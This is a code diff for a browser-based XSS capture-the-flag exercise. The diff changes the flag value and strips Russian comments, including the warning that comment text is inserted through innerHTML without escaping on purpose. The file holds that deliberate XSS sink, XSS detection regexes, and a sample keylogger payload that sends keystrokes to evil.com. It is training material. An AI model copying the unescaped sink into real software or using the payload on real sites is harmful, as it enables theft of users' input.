@@ -6,7 +6,7 @@
 class XSSChallenge {
     constructor() {
         this.comments = [];
-        this.flag = 'CTF{XSS_MASTER_2024}'; // Единый флаг
+        this.flag = 'CTF{xss_d0m_m4st3r_2024}';
         this.init();
     }
 
@@ -48,7 +48,7 @@ class XSSChallenge {
             });
         }
 
-        // Обработчики для кнопок управления
+
         const hintBtn = document.querySelector('button[onclick*="showChallengeHint"]');
         const flagBtn = document.querySelector('button[onclick*="validateChallengeFlag"]');
 
@@ -86,10 +86,10 @@ class XSSChallenge {
     }
 
     checkExistingXSS() {
-        // Проверяем, не был ли уже выполнен XSS
+
         const solvedChallenges = JSON.parse(localStorage.getItem('solvedChallenges') || '{}');
         if (solvedChallenges['XSS Challenge']) {
-            this.showFlag(false); // Показываем флаг без анимации
+            this.showFlag(false);
         }
     }
 
@@ -115,7 +115,7 @@ class XSSChallenge {
 
         commentInput.value = '';
 
-        // Проверяем XSS payload
+
         this.checkForXSS(text);
     }
 
@@ -130,7 +130,7 @@ class XSSChallenge {
             container.appendChild(commentElement);
         });
 
-        // Прокручиваем к последнему комментарию
+
         container.scrollTop = container.scrollHeight;
     }
 
@@ -148,8 +148,7 @@ class XSSChallenge {
         const textDiv = document.createElement('div');
         textDiv.className = 'comment-text';
 
-        // ОПАСНО: не экранируем HTML для демонстрации XSS уязвимости
-        // В реальном приложении всегда используйте CTFUtils.escapeHtml(comment.text)
+
         textDiv.innerHTML = comment.text;
 
         commentDiv.appendChild(metaDiv);
@@ -166,7 +165,7 @@ class XSSChallenge {
     }
 
     checkForXSS(text) {
-        // Простая проверка на XSS payload
+
         const xssPatterns = [
             /<script>/i,
             /javascript:/i,
@@ -198,7 +197,7 @@ class XSSChallenge {
         const container = document.getElementById('commentsContainer');
         if (!container) return;
 
-        // Удаляем предыдущий флаг если есть
+
         const existingFlag = container.querySelector('.flag-message');
         if (existingFlag) {
             existingFlag.remove();
@@ -230,10 +229,10 @@ class XSSChallenge {
 
         container.appendChild(flagElement);
 
-        // Прокручиваем к флагу
+
         flagElement.scrollIntoView({ behavior: 'smooth' });
 
-        // Автоматически копируем флаг в буфер обмена
+
         setTimeout(() => {
             CTFUtils.copyToClipboard(this.flag);
         }, 1000);
@@ -243,7 +242,7 @@ class XSSChallenge {
         if (window.webChallengesManager) {
             window.webChallengesManager.markChallengeAsSolved('XSS Challenge');
         } else {
-            // Fallback
+
             const solvedChallenges = JSON.parse(localStorage.getItem('solvedChallenges') || '{}');
             solvedChallenges['XSS Challenge'] = true;
             localStorage.setItem('solvedChallenges', JSON.stringify(solvedChallenges));
@@ -268,7 +267,7 @@ class XSSChallenge {
             "Keylogger: <script>document.onkeypress=function(e){fetch('http://evil.com?key='+e.key)}</script>"
         ];
 
-        // Создаем модальное окно с примерами
+
         const modal = document.createElement('div');
         modal.style.cssText = `
             position: fixed;
@@ -315,7 +314,7 @@ class XSSChallenge {
             exampleDiv.style.border = '1px solid var(--border-color)';
             exampleDiv.textContent = `${index + 1}. ${example}`;
 
-            // Добавляем возможность копирования
+
             exampleDiv.style.cursor = 'pointer';
             exampleDiv.addEventListener('click', () => {
                 const payload = example.split(': ')[1];
@@ -360,7 +359,7 @@ class XSSChallenge {
     }
 }
 
-// Инициализация на странице XSS
+
 document.addEventListener('DOMContentLoaded', () => {
     if (window.location.pathname.includes('/xss')) {
         window.xssChallenge = new XSSChallenge();
